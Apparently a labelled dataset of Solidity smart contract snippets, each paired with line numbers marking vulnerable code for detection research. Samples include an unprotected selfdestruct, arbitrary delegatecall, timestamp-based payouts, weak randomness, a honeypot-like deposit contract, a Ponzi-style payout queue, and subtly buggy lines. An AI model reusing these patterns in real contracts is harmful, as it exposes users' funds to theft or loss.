            plugin.execute.selector, path, amounts, addresses, data
        ));
        require(success, string(returnData));
      }
    }
  }
  // This makes sure that the balance after the payment not less than before.
  // Prevents draining of the contract.
  function _ensureBalance(address tokenOut, uint balanceBefore) private view {
    require(_balance(tokenOut) >= balanceBefore, 'DePay: Insufficient balance after payment!');
  }
  // Returns the balance of the payment plugin contract for a token (or ETH).
  function _balance(address token) private view returns(uint) {
    if(token == ETH) {
        return address(this).balance;
    } else {
        return IERC20(token).balanceOf(address(this));
    }
  }
  // Function to check if a plugin address is approved.
  function isApproved(
    address pluginAddress
  ) external view returns(bool){
    return _isApproved(pluginAddress);
  }
  // Internal function to check if a plugin address is approved.
  function _isApproved(
    address pluginAddress
  ) internal view returns(bool) {
    return (configuration.approvedPlugins(pluginAddress) != address(0));
  }
  // Allows to withdraw accidentally sent ETH or tokens.
  function withdraw(
    address token,
    uint amount
  ) external onlyOwner returns(bool) {
    if(token == ETH) {
      Helper.safeTransferETH(payable(configuration.owner()), amount);
    } else {
      Helper.safeTransfer(token, payable(configuration.owner()), amount);
    }
    return true;
  }
}","[63, 64, 65]"
"    // Jury members can vote during voting period
    // The _votes parameter should be an array of team addresses, sorted by score from highest to lowest based on jury member's preferences
    function vote(address[] _votes) onlyJury {
        require(currentPeriod == Period.Voting);
        require(_votes.length == teamAddresses.length);
        require(juryMembers[msg.sender].hasVoted == false);
        uint _points = _votes.length;
        for(uint i = 0; i < _votes.length; i++) {
            address teamAddress = _votes[i];
            // All submitted teams must be registered
            require(bytes(teams[teamAddress].name).length > 0);
            // Judge should not be able to vote for the same team more than once
            require(teams[teamAddress].votedForByJuryMember[msg.sender] == false);
            teams[teamAddress].score += _points;
            teams[teamAddress].votedForByJuryMember[msg.sender] = true;
            VoteReceived(juryMembers[msg.sender].name, teamAddress, _points);
            _points--;
        }
        // This will prevent jury members from voting more than once
        juryMembers[msg.sender].hasVoted = true;
    }
    // Administrator can initiate prize payout during final period
    // The _sortedTeams parameter should be an array of correctly sorted teams by score, from highest to lowest
    function payoutPrizes(address[] _sortedTeams) onlyOwner {
        require(currentPeriod == Period.Verification);
        require(_sortedTeams.length == teamAddresses.length);
        for(uint i = 0; i < _sortedTeams.length; i++) {
            // All submitted teams must be registered
            require(bytes(teams[_sortedTeams[i]].name).length > 0);
            // Teams must be sorted correctly
            require(i == _sortedTeams.length - 1 || teams[_sortedTeams[i + 1]].score <= teams[_sortedTeams[i]].score);
            teams[_sortedTeams[i]].submittedByAdmin = true;
        }
        // Prizes are paid based on logarithmic scale, where first teams receives 1/2 of the prize pool, second 1/4 and so on
        uint prizePoolDivider = 2;
        for(i = 0; i < _sortedTeams.length; i++) {
            // Make sure all teams are included in _sortedTeams array
            // (i.e. the array should contain unique elements)
            require(teams[_sortedTeams[i]].submittedByAdmin);
            uint _prizeAmount = totalContribution / prizePoolDivider;
            if(teams[_sortedTeams[i]].rewardEligible && !teams[_sortedTeams[i]].disqualified) {
                _sortedTeams[i].transfer(_prizeAmount);
                teams[_sortedTeams[i]].reward = _prizeAmount;
                prizePoolDivider *= 2;
                PrizePaid(teams[_sortedTeams[i]].name, _prizeAmount);
            }
        }
        // Some small amount of ETH might remain in the contract after payout, becuase rewards are determened logarithmically
        // This amount is returned to contract owner to cover deployment and transaction costs
        // In case this amount turns out to be significantly larger than these costs, the administrator will distribute it to all teams equally
        administrator.transfer(this.balance);
        currentPeriod = Period.End;
        PeriodChanged(currentPeriod);
    }
    // Administrator can disqualify team
    function disqualifyTeam(address _teamAddress) onlyOwner {
        require(bytes(teams[_teamAddress].name).length > 0);
        teams[_teamAddress].disqualified = true;
        TeamDisqualified(_teamAddress);
    }
    // In case something goes wrong and contract needs to be redeployed, this is a way to return all contributions to the sponsors
    function returnContributionsToTheSponsors() onlyOwner {
        for(uint i = i; i < sponsors.length; i++) {
            sponsors[i].ethAddress.transfer(sponsors[i].contribution);
        }
    }
    // Public function that returns user type for the given address
    function getUserType(address _address) constant returns (string) {
        if(_address == administrator) {
            return ""administrator"";
        } else if(bytes(juryMembers[_address].name).length > 0) {
            return ""jury"";
        } else {
            return ""other"";
        }
    }
    // Check if jury member voted
    function checkJuryVoted(address _juryAddress) constant returns (bool){
        require(bytes(juryMembers[_juryAddress].name).length != 0);
        return juryMembers[_juryAddress].hasVoted;
    }
    // Returns total prize pool size
    function getPrizePoolSize() constant returns (uint) {
        return totalContribution;
    }
    function restartPeriod() onlyOwner {
        currentPeriod = Period.Registration;
    }
}",[64]
"    }
}
contract Storage {
    struct Provider {
        IDollar dollar;
        IOracle oracle;
        address pool;
    }
    struct Balance {
        uint256 supply;
        uint256 bonded;
        uint256 staged;
        uint256 redeemable;
        uint256 debt;
        uint256 coupons;
    }
    struct State {
        Epoch.Global epoch;
        Balance balance;
        Provider provider;
        mapping(address => Account.State) accounts;
        mapping(uint256 => Epoch.State) epochs;
        mapping(address => Candidate.State) candidates;
    }
}
contract State {
    Storage.State _state;
}
/*
    Copyright 2018-2019 zOS Global Limited
    Copyright 2020 True Seigniorage Dollar Devs, based on the works of the Empty Set Squad and Dynamic Dollar Devs
    Licensed under the Apache License, Version 2.0 (the ""License"");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at
    http://www.apache.org/licenses/LICENSE-2.0
    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an ""AS IS"" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
*/
/**
 * Based off of, and designed to interface with, openzeppelin/upgrades package
 */
contract Upgradeable is State {
    /**
     * @dev Storage slot with the address of the current implementation.
     * This is the keccak-256 hash of ""eip1967.proxy.implementation"" subtracted by 1, and is
     * validated in the constructor.
     */
    bytes32 private constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    /**
     * @dev Emitted when the implementation is upgraded.
     * @param implementation Address of the new implementation.
     */
    event Upgraded(address indexed implementation);
    function initialize() public;
    /**
     * @dev Upgrades the proxy to a new implementation.
     * @param newImplementation Address of the new implementation.
     */
    function upgradeTo(address newImplementation) internal {
        setImplementation(newImplementation);
        (bool success, bytes memory reason) = newImplementation.delegatecall(abi.encodeWithSignature(""initialize()""));
        require(success, string(reason));
        emit Upgraded(newImplementation);
    }
    /**
     * @dev Sets the implementation address of the proxy.
     * @param newImplementation Address of the new implementation.
     */
    function setImplementation(address newImplementation) private {
        require(OpenZeppelinUpgradesAddress.isContract(newImplementation), ""Cannot set a proxy implementation to a non-contract address"");
        bytes32 slot = IMPLEMENTATION_SLOT;
        assembly {
            sstore(slot, newImplementation)
        }
    }
}
/*
    Copyright 2020 True Seigniorage Dollar Devs, based on the works of the Empty Set Squad and Dynamic Dollar Devs
    Licensed under the Apache License, Version 2.0 (the ""License"");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at
    http://www.apache.org/licenses/LICENSE-2.0
    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an ""AS IS"" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
*/
contract Getters is State {
    using SafeMath for uint256;
    using Decimal for Decimal.D256;
    bytes32 private constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    /**
     * ERC20 Interface
     */
    function name() public view returns (string memory) {
        return ""True Seigniorage Dollar Stake"";
    }
    function symbol() public view returns (string memory) {
        return ""TSDS"";
    }
    function decimals() public view returns (uint8) {
        return 18;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _state.accounts[account].balance;
    }
    function totalSupply() public view returns (uint256) {
        return _state.balance.supply;
    }
    function allowance(address owner, address spender) external view returns (uint256) {
        return 0;
    }
    /**
     * Global
     */
    function dollar() public view returns (IDollar) {
        return _state.provider.dollar;
    }
    function oracle() public view returns (IOracle) {
        return _state.provider.oracle;
    }
    function pool() public view returns (address) {
        return _state.provider.pool;
    }",[64]
"// Copyright (C) 2017  The Halo Platform by Scott Morrison
//
// This is free software and you are welcome to redistribute it under certain conditions.
// ABSOLUTELY NO WARRANTY; for details visit: https://www.gnu.org/licenses/gpl-2.0.html
//
pragma solidity ^0.4.13;
contract ForeignToken {
    function balanceOf(address who) constant public returns (uint256);
    function transfer(address to, uint256 amount) public;
}
contract Owned {
    address public Owner = msg.sender;
    modifier onlyOwner { if (msg.sender == Owner) _; }
}
contract Deposit is Owned {
    address public Owner;
    mapping (address => uint) public Deposits;
    event Deposit(uint amount);
    event Withdraw(uint amount);
    function Vault() payable {
        Owner = msg.sender;
        deposit();
    }
    function() payable {
        deposit();
    }
    function deposit() payable {
        if (msg.value >= 1 ether) {
            Deposits[msg.sender] += msg.value;
            Deposit(msg.value);
        }
    }
    function kill() {
        if (this.balance == 0)
            selfdestruct(msg.sender);
    }
    function withdraw(uint amount) payable onlyOwner {
        if (Deposits[msg.sender] > 0 && amount <= Deposits[msg.sender]) {
            msg.sender.transfer(amount);
            Withdraw(amount);
        }
    }
    function withdrawToken(address token, uint amount) payable onlyOwner {
        uint bal = ForeignToken(token).balanceOf(address(this));
        if (bal >= amount) {
            ForeignToken(token).transfer(msg.sender, amount);
        }
    }
}","[29, 33, 34, 35]"
"pragma solidity ^0.4.23;
contract Destroy{
      function delegatecall_selfdestruct(address _target) external returns (bool _ans) {
          _ans = _target.delegatecall(bytes4(sha3(""address)"")), this); 
      }
}",[4]
"pragma solidity ^0.4.0;
contract Destroyable{
    /**
     * @notice Allows to destroy the contract and return the tokens to the owner.
     */
    function destroy() public{
        selfdestruct(address(this));
    }
}","[6, 7]"
"				_ticketsBought = msg.value / ticketPrice;
			}
			// Do we have enough tickets for this sale?
			require(minimumTickets - totalTickets >= _ticketsBought);
			// Increment the quantity of tickets sold
			totalTickets = totalTickets + _ticketsBought;
			// Save the buyer
			buyers[totalBuyers] = Buyer(msg.sender, totalTickets, msg.value);
			// Save the new buyers counter
			totalBuyers = totalBuyers + 1;
			// We sold all the tickets?
			if (totalTickets >= minimumTickets) {
				finalSuccess();
			}
		// Protection, unblock funds by the winner, only after sell was closed
		} else if (saleState == States.NoEntry) {
			// Only winner
			require(msg.sender == buyers[winnerKey].ethAddress);
			// Check if there is enough balance
			require(this.balance > 0);
			// Amount should be zero
			require(msg.value == 0);
			// Setting the state of the sale
			saleState = States.Succeeded;
			// Send fee percent amount to us
			uint256 _creatorFee = (this.balance * creatorFeePercent / 100);
			creator.send(_creatorFee);
			// Another amount to the seller
			seller.send(this.balance);
		// Not allowed to send call
		} else {
			require(false);
		}
	}
	/*
		Completion
	*/
	// Not enough tickets sold within timeframe, the sale failed
	function saleFinalize() public inState(States.Started) {
		// Is it the time?
		require(now >= saleEndTime);
		// Set new sale state
		saleState = States.Failed;
		// Return all the funds to the buyers
		returnToBuyers();
	}
	// Complete, success
	function finalSuccess() private {
		// Set the datetime of a successful processing
		successfulTime = now;
		// Set new sale state
		saleState = States.NoEntry;
		// Select the winning ticket number
		winnerTicket = getRand(totalTickets) + 1;
		// Get the winner address
		winnerKey = getWinnerKey();
	}
	/*
		Sale protection
	*/
	// Protection, return funds after the timeout if the winner did not unblocked the funds
	function revertFunds() public inState(States.NoEntry) {
		// Is it the time?
		require(now >= successfulTime + 30 * 1 days);
		// Setting the state of the sale
		saleState = States.Failed;
		// Return all the funds to the buyers
		returnToBuyers();
	}
	// Continue to return funds in case the process was interrupted
	function returnToBuyersContinue() public inState(States.Failed) {
		// We didn't finished the refund yet
		require(returnLastBuyerIndex < totalBuyers);
		// Start the return process
		returnToBuyers();
	}
	/*
		System
	*/
	// In case of emergeny, pull the lever
	function pullTheLever() public onlyCreator {
		// Destruct the contract
		selfdestruct(creator);
	}
	// Pseudo random function, from 0 to _max (exclusive)
	function getRand(uint256 _max) private view returns(uint256) {
		return (uint256(keccak256(block.difficulty, block.coinbase, now, block.blockhash(block.number - 1))) % _max);
	}
	// Get winner account
	function getWinnerAccount() public view returns(address) {
		// There should be a winner ticket selected
		require(winnerTicket > 0);
		// Return the winners address
		return buyers[winnerKey].ethAddress;
	}
	// Return all the funds to the buyers
	function returnToBuyers() private {
		// Check if there is enough balance
		if (this.balance > 0) {
			// Sending funds back (with a gas limiter check)
			uint256 _i = returnLastBuyerIndex;
			while (_i < totalBuyers && msg.gas > 200000) {
				buyers[_i].ethAddress.send(buyers[_i].amountPaid);
				_i++;
			}
			returnLastBuyerIndex = _i;
		}
	}
	// Get the winner key for a winner ticket
	function getWinnerKey() private view returns(uint256) {
		// Reset the variables
		uint256 _i = 0;
		uint256 _j = totalBuyers - 1;
		uint256 _n = 0;
		// Let's search who bought this ticket
		do {
			// Buyer found in a lower limiter
			if (buyers[_i].atTicket >= winnerTicket) {
				return _i;
			// Buyer found in a higher limiter
			} else if (buyers[_j].atTicket <= winnerTicket) {
				return _j;
			// Only two elements left, get the biggest
			} else if ((_j - _i + 1) == 2) {
				return _j;
			}
			// Split the mapping into halves
			_n = ((_j - _i) / 2) + _i;",[64]
"// SPDX-License-Identifier: MIT
pragma solidity 0.8.3;
interface IDharmaActionRegistry {
  function initialize() external;
}
/**
 * @title DharmaActionRegistry
 * @author cf
 * @notice This contract delegates all logic, to an implementation contract
 * whose address is held by the upgrade-beacon specified at initialization.
 */
contract DharmaActionRegistry {
  // Declare upgrade beacon address as a immutable (i.e. not in contract storage).
  // The value is set at deployment in the constructor.
  address immutable _UPGRADE_BEACON;
  /**
   * @notice In the constructor, set the upgrade-beacon address.
   * implementation set on the upgrade beacon, supplying initialization calldata
   * as a constructor argument. The deployment will revert and pass along the
   * revert reason in the event that this initialization delegatecall reverts.
   * @param upgradeBeaconAddress address to set as the upgrade-beacon that
   * holds the implementation contract
   */
  constructor(address upgradeBeaconAddress) {
    // Ensure upgrade-beacon is specified
    require(upgradeBeaconAddress != address(0), ""Must specify an upgrade-beacon address."");
    // Ensure that the upgrade-beacon contract has code via extcodesize.
    uint256 upgradeBeaconSize;
    assembly { upgradeBeaconSize := extcodesize(upgradeBeaconAddress) }
    require(upgradeBeaconSize > 0, ""upgrade-beacon must have contract code."");
    _UPGRADE_BEACON = upgradeBeaconAddress;
    // retrieve implementation to initialize - this is the same logic as _implementation
    (bool ok, bytes memory returnData) = upgradeBeaconAddress.staticcall("""");
    // Revert and pass along revert message if call to upgrade beacon reverts.
    if(!ok) {
      assembly {
        returndatacopy(0, 0, returndatasize())
        revert(0, returndatasize())
      }
    }
    // Get the implementation to the address returned from the upgrade beacon.
    address implementation = abi.decode(returnData, (address));
    // Delegatecall into the implementation, supplying initialization calldata.
    (ok, ) = implementation.delegatecall(abi.encodeWithSelector(IDharmaActionRegistry.initialize.selector));
    // Revert and include revert data if delegatecall to implementation reverts.
    if (!ok) {
      assembly {
        returndatacopy(0, 0, returndatasize())
        revert(0, returndatasize())
      }
    }
  }
  /**
   * @notice In the fallback, delegate execution to the implementation set on
   * the upgrade beacon.
   */
  fallback() external {
    // Delegate execution to implementation contract provided by upgrade beacon.
    _delegate(_implementation());
  }
  /**
   * @notice Private view function to get the current implementation from the
   * upgrade beacon. This is accomplished via a staticcall to the beacon with no
   * data, and the beacon will return an abi-encoded implementation address.
   * @return implementation address of the implementation.
   */
  function _implementation() private view returns (address implementation) {
    // Get the current implementation address from the upgrade beacon.
    (bool ok, bytes memory returnData) = _UPGRADE_BEACON.staticcall("""");
    // Revert and pass along revert message if call to upgrade beacon reverts.
    require(ok, string(returnData));
    // Set the implementation to the address returned from the upgrade beacon.
    implementation = abi.decode(returnData, (address));
  }
  /**
   * @notice Private function that delegates execution to an implementation
   * contract. This is a low level function that doesn't return to its internal
   * call site. It will return whatever is returned by the implementation to the
   * external caller, reverting and returning the revert data if implementation
   * reverts.
   * @param implementation address to delegate.
   */
  function _delegate(address implementation) private {
    assembly {
    // Copy msg.data. We take full control of memory in this inline assembly
    // block because it will not return to Solidity code. We overwrite the
    // Solidity scratch pad at memory position 0.
      calldatacopy(0, 0, calldatasize())
    // Delegatecall to the implementation, supplying calldata and gas.
    // Out and outsize are set to zero - instead, use the return buffer.
      let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
    // Copy the returned data from the return buffer.
      returndatacopy(0, 0, returndatasize())
      switch result
      // Delegatecall returns 0 on error.
      case 0 { revert(0, returndatasize()) }
      default { return(0, returndatasize()) }
    }
  }
}",[44]
"/**
██████╗░██╗░██████╗██████╗░███████╗███╗░░██╗░██████╗███████╗██████╗░
██╔══██╗██║██╔════╝██╔══██╗██╔════╝████╗░██║██╔════╝██╔════╝██╔══██╗
██║░░██║██║╚█████╗░██████╔╝█████╗░░██╔██╗██║╚█████╗░█████╗░░██████╔╝
██║░░██║██║░╚═══██╗██╔═══╝░██╔══╝░░██║╚████║░╚═══██╗██╔══╝░░██╔══██╗
██████╔╝██║██████╔╝██║░░░░░███████╗██║░╚███║██████╔╝███████╗██║░░██║
╚═════╝░╚═╝╚═════╝░╚═╝░░░░░╚══════╝╚═╝░░╚══╝╚═════╝░╚══════╝╚═╝░░╚═╝
by Conductive Research 
We bring together everything that’s required to build token utility
Work with us 👉 https://www.conductiveresearch.com
Follow us on twitter: @0xConductive
*/
pragma solidity ^0.4.25;
interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}
contract Dispenser {
    function dispenseEther(address[] recipients, uint256[] values) external payable {
        for (uint256 i = 0; i < recipients.length; i++)
            recipients[i].transfer(values[i]);
        uint256 balance = address(this).balance;
        if (balance > 0)
            msg.sender.transfer(balance);
    }
    function dispenseToken(IERC20 token, address[] recipients, uint256[] values) external {
        uint256 total = 0;
        for (uint256 i = 0; i < recipients.length; i++)
            total += values[i];
        require(token.transferFrom(msg.sender, address(this), total));
        for (i = 0; i < recipients.length; i++)
            require(token.transfer(recipients[i], values[i]));
    }
    function dispenseTokenSimple(IERC20 token, address[] recipients, uint256[] values) external {
        for (uint256 i = 0; i < recipients.length; i++)
            require(token.transferFrom(msg.sender, recipients[i], values[i]));
    }
}",[21]
"pragma solidity ^0.4.25;
interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}
contract Disperse {
    function disperseEther(address[] recipients, uint256[] values) external payable {
        for (uint256 i = 0; i < recipients.length; i++)
            recipients[i].transfer(values[i]);
        uint256 balance = address(this).balance;
        if (balance > 0)
            msg.sender.transfer(balance);
    }
    function disperseToken(IERC20 token, address[] recipients, uint256[] values) external {
        uint256 total = 0;
        for (uint256 i = 0; i < recipients.length; i++)
            total += values[i];
        require(token.transferFrom(msg.sender, address(this), total));
        for (i = 0; i < recipients.length; i++)
            require(token.transfer(recipients[i], values[i]));
    }
    function disperseTokenSimple(IERC20 token, address[] recipients, uint256[] values) external {
        for (uint256 i = 0; i < recipients.length; i++)
            require(token.transferFrom(msg.sender, recipients[i], values[i]));
    }
}",[9]
"// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;
interface IERC721 {
    function ownerOf(uint256 tokenId) external view returns (address owner);
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}
interface IERC1155 {
    function balanceOf(address account, uint256 id) external view returns (uint256);
    function isApprovedForAll(address account, address operator) external view returns (bool);
    function safeTransferFrom(address from, address to, uint256 id, uint256 amount, bytes calldata data) external;
}
interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}
contract Disperse {
    function disperseEther(address[] calldata recipients, uint256[] calldata values) external payable {
        for (uint256 i = 0; i < recipients.length; i++)
            payable(recipients[i]).transfer(values[i]);
        uint256 balance = address(this).balance;
        if (balance > 0)
            payable(msg.sender).transfer(balance);
    }
    function disperseTokenERC20(IERC20 token, address[] calldata recipients, uint256[] calldata values) external {
        uint256 total = 0;
        for (uint256 i = 0; i < recipients.length; i++)
            total += values[i];
        require(token.transferFrom(msg.sender, address(this), total), ""ERC20: transfer caller is not approved"");
        for (uint256 i = 0; i < recipients.length; i++)
            require(token.transfer(recipients[i], values[i]));
    }
    function disperseTokenERC721(IERC721[] calldata tokens, address[] calldata recipients, uint256[] calldata tokenIds) external {
        require(tokens.length == recipients.length, ""ERC721: tokens and recipients length mismatch"");
        require(tokenIds.length == recipients.length, ""ERC721: recipients and tokenIds length mismatch"");
        for (uint256 i = 0; i < recipients.length; i++){
            require(tokens[i].ownerOf(tokenIds[i]) == msg.sender, ""ERC721: transfer caller is not owner"");
            require(tokens[i].isApprovedForAll(msg.sender, address(this)), ""ERC721: transfer caller is not approved"");
        }
        for (uint256 i = 0; i < recipients.length; i++)
            tokens[i].safeTransferFrom(msg.sender, recipients[i], tokenIds[i]);
    }
    function disperseTokenERC1155(IERC1155[] calldata tokens, address[] calldata recipients, uint256[] calldata tokenIds, uint256[] calldata amounts, bytes[] calldata datas) external {
        require(tokens.length == recipients.length, ""ERC1155: tokens and recipients length mismatch"");
        require(tokenIds.length == recipients.length, ""ERC1155: tokens and recipients length mismatch"");
        for (uint256 i = 0; i < recipients.length; i++){
            require(tokens[i].balanceOf(msg.sender,tokenIds[i]) >= amounts[i], ""ERC1155: insufficient balance for transfer"");
            require(tokens[i].isApprovedForAll(msg.sender, address(this)), ""ERC1155: transfer caller is not approved"");
        }
        for (uint256 i = 0; i < recipients.length; i++)
            tokens[i].safeTransferFrom(msg.sender, recipients[i], tokenIds[i], amounts[i], datas[i]);
    }
}","[20, 41, 51]"
"pragma solidity ^0.4.25;
interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}
contract DisperseVKZ {
    function disperseEther(address[] recipients, uint256[] values) external payable {
        for (uint256 i = 0; i < recipients.length; i++)
            recipients[i].transfer(values[i]);
        uint256 balance = address(this).balance;
        if (balance > 0)
            msg.sender.transfer(balance);
    }
    function disperseToken(IERC20 token, address[] recipients, uint256[] values) external {
        uint256 total = 0;
        for (uint256 i = 0; i < recipients.length; i++)
            total += values[i];
        require(token.transferFrom(msg.sender, address(this), total));
        for (i = 0; i < recipients.length; i++)
            require(token.transfer(recipients[i], values[i]));
    }
    function disperseTokenSimple(IERC20 token, address[] recipients, uint256[] values) external {
        for (uint256 i = 0; i < recipients.length; i++)
            require(token.transferFrom(msg.sender, recipients[i], values[i]));
    }
}",[9]
"pragma solidity ^0.4.0;
contract Distribute {
    address public owner;
    constructor() public {
        owner = msg.sender;
    }
    //批量转账  
    function transferETHS(address[] _tos) payable public returns(bool) {
        require(_tos.length > 0);
        uint val = this.balance / _tos.length;
        for (uint32 i = 0; i < _tos.length; i++) {
            _tos[i].transfer(val);
        }
        return true;
    }
    function () payable public {
        owner.transfer(this.balance);
    }
}","[10, 11, 12]"
"pragma solidity ^0.4.0;
contract Distribute {
    address public owner;
    constructor() public {
        owner = msg.sender;
    }
    function transferETHS(address[] _tos) payable public returns(bool) {
        require(_tos.length > 0);
        uint val = this.balance / _tos.length;
        for (uint i = 0; i < _tos.length; i++) {
            _tos[i].transfer(val);
        }
        return true;
    }
    function () payable public {
        owner.transfer(this.balance);
    }
}","[10, 11]"
"pragma solidity ^0.4.18;
/**
 * @title Ownable
 * @dev The Ownable contract has an owner address, and provides basic authorization control
 * functions, this simplifies the implementation of ""user permissions"".
 */
contract Ownable {
  address public owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  /**
   * @dev The Ownable constructor sets the original `owner` of the contract to the sender
   * account.
   */
  function Ownable() {
    owner = msg.sender;
  }
  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
  /**
   * @dev Allows the current owner to transfer control of the contract to a newOwner.
   * @param newOwner The address to transfer ownership to.
   */
  function transferOwnership(address newOwner) onlyOwner public {
    require(newOwner != address(0));
    OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }
}
contract DistributeETH is Ownable {
  function distribute(address[] _addrs, uint[] _bals) onlyOwner public{
    for(uint i = 0; i < _addrs.length; ++i){
      if(!_addrs[i].send(_bals[i])) throw;
    }
  }
  function multiSendEth(address[] addresses) public onlyOwner{
    for(uint i = 0; i < addresses.length; i++) {
      addresses[i].transfer(msg.value / addresses.length);
    }
    msg.sender.transfer(this.balance);
  }
}","[37, 42]"
"pragma solidity ^0.4.17;
contract Distributor
{
    address owner = msg.sender;
    address newOwner = msg.sender;
    function ChangeOwner(address _newOwner)
    public
    {
        require(msg.sender == owner);
        newOwner = _newOwner;
    }
    function ConfirmOwner()
    public
    {
        require(newOwner==msg.sender);
        owner=newOwner;
    }
    function Withdrawal()
    public
    payable
    {
        owner.transfer(this.balance);
    }
    function Send(address[] addr, uint[] val)
    public
    payable
    {
        require(val.length==addr.length);
        uint total;
        for (uint j=0; j<val.length; j++)
        {
            require(addr[j]!=0x0);
            total+=val[j];
        }
        if(msg.value>=total)
        {
            for (uint i=0; i<addr.length; i++)
            {
                addr[i].transfer(val[i]);
            }
        }
    }
}",[39]
"pragma solidity ^0.4.23;
contract DivX
{
    address  sender;
    address  receiver;
    uint unlockTime = 86400 * 7;
    bool closed = false;
    function PutDiv(address _receiver) public payable {
        if( (!closed&&(msg.value >=0.25 ether)) || sender==0x0 ) {
            sender = msg.sender;
            receiver = _receiver;
            unlockTime += now;
        }
    }
    function SetDivTime(uint _unixTime) public {
        if(msg.sender==sender) {
            unlockTime = _unixTime;
        }
    }
    function GetDiv() public payable {
        if(receiver==msg.sender&&now>unlockTime) {
            msg.sender.transfer(address(this).balance);
        }
    }
    function CloseDiv() public {
        if (msg.sender==receiver&&receiver!=0x0) {
           closed=true;
        } else revert();
    }
    function() public payable{}
}","[12, 21]"
"pragma solidity ^0.4.17;
contract Double {
    function () public payable {
        if(block.timestamp % 2 == 0) {
            msg.sender.transfer(msg.value * 2);
        }
    }
}",[4]
"            require(!safeguard);
            require (_to != address(0x0));                      // Prevent transfer to 0x0 address. Use burn() instead
            require (balanceOf[_from] >= _value);               // Check if the sender has enough
            require (balanceOf[_to].add(_value) >= balanceOf[_to]); // Check for overflows
            require(!frozenAccount[_from]);                     // Check if sender is frozen
            require(!frozenAccount[_to]);                       // Check if recipient is frozen
            balanceOf[_from] = balanceOf[_from].sub(_value);    // Subtract from the sender
            balanceOf[_to] = balanceOf[_to].add(_value);        // Add the same to the recipient
            emit Transfer(_from, _to, _value);
        }
        /// @notice `freeze? Prevent | Allow` `target` from sending & receiving tokens
        /// @param target Address to be frozen
        /// @param freeze either to freeze it or not
        function freezeAccount(address target, bool freeze) onlyOwner public {
                frozenAccount[target] = freeze;
            emit  FrozenFunds(target, freeze);
        }
        /**
         * Change safeguard status on or off
         *
         * When safeguard is true, then all the non-owner functions will stop working.
         * When safeguard is false, then all the functions will resume working back again!
         */
        function changeSafeguardStatus() onlyOwner public{
            if (safeguard == false){
                safeguard = true;
            }
            else{
                safeguard = false;
            }
        }
        /*******************************************/
        /* Code for the Double Ether Functionality */
        /*******************************************/
        uint256 public returnPercentage = 150;  // 150% return, which is 1.5 times the amount deposited
        uint256 public additionalFund = 0;
        address payable[] public winnerQueueAddresses;
        uint256[] public winnerQueueAmount;
        // This will log for all the deposits made by users
        event Deposit(address indexed depositor, uint256 depositAmount);
        // This will log for any ether paid to users
        event RewardPaid(address indexed rewardPayee, uint256 rewardAmount);
        function showPeopleInQueue() public view returns(uint256) {
            return winnerQueueAmount.length;
        }
        //@dev fallback function, which accepts ether
        function () payable external {
            require(!safeguard);
            require(!frozenAccount[msg.sender]);
            require(msg.value >= 0.5 ether);
            //If users send more than 3 ether, then it will consider only 3 ether, and rest goes to owner as service fee
            uint256 _depositedEther;
            if(msg.value >= 3 ether){
                _depositedEther = 3 ether;
                additionalFund += msg.value - 3 ether;
            }
            else{
                _depositedEther = msg.value;
            }
            //following loop will send reward to one or more addresses
            uint256 TotalPeopleInQueue = winnerQueueAmount.length;
            for(uint256 index = 0; index < TotalPeopleInQueue; index++){
                if(winnerQueueAmount[0] <= (address(this).balance - additionalFund) ){
                    //transfer the ether and token to leader / first position
                    winnerQueueAddresses[0].transfer(winnerQueueAmount[0]);
                    _transfer(address(this), winnerQueueAddresses[0], winnerQueueAmount[0]*100/returnPercentage);
                    //this will shift one index up in both arrays, removing the person who is paid
                    for (uint256 i = 0; i<winnerQueueAmount.length-1; i++){
                        winnerQueueAmount[i] = winnerQueueAmount[i+1];
                        winnerQueueAddresses[i] = winnerQueueAddresses[i+1];
                    }
                    winnerQueueAmount.length--;
                    winnerQueueAddresses.length--;
                }
                else{
                    //because there is not enough ether in contract to pay for leader, so break.
                    break;
                }
            }
            //Putting depositor in the queue
            winnerQueueAddresses.push(msg.sender);
            winnerQueueAmount.push(_depositedEther * returnPercentage / 100);
            emit Deposit(msg.sender, msg.value);
        }
        //Just in rare case, owner wants to transfer Ether from contract to owner address.Like owner decided to destruct this contract.
        function manualWithdrawEtherAll() onlyOwner public{
            address(owner).transfer(address(this).balance);
        }
        //It is useful when owner wants to transfer additionalFund, which is fund sent by users more than 3 ether, or after removing any stuck address.
        function manualWithdrawEtherAdditionalOnly() onlyOwner public{
            additionalFund = 0;
            address(owner).transfer(additionalFund);
        }
        //Just in rare case, owner wants to transfer Tokens from contract to owner address
        function manualWithdrawTokens(uint tokenAmount) onlyOwner public{
            //no need to validate the input amount as transfer function automatically throws for invalid amounts
            _transfer(address(this), address(owner), tokenAmount);
        }
        //selfdestruct function. just in case owner decided to destruct this contract.
        function destructContract()onlyOwner public{
            selfdestruct(owner);
        }
        //To remove any stuck address and un-stuck the queue.
        //This often happen if user have put contract address, and contract does not receive ether.
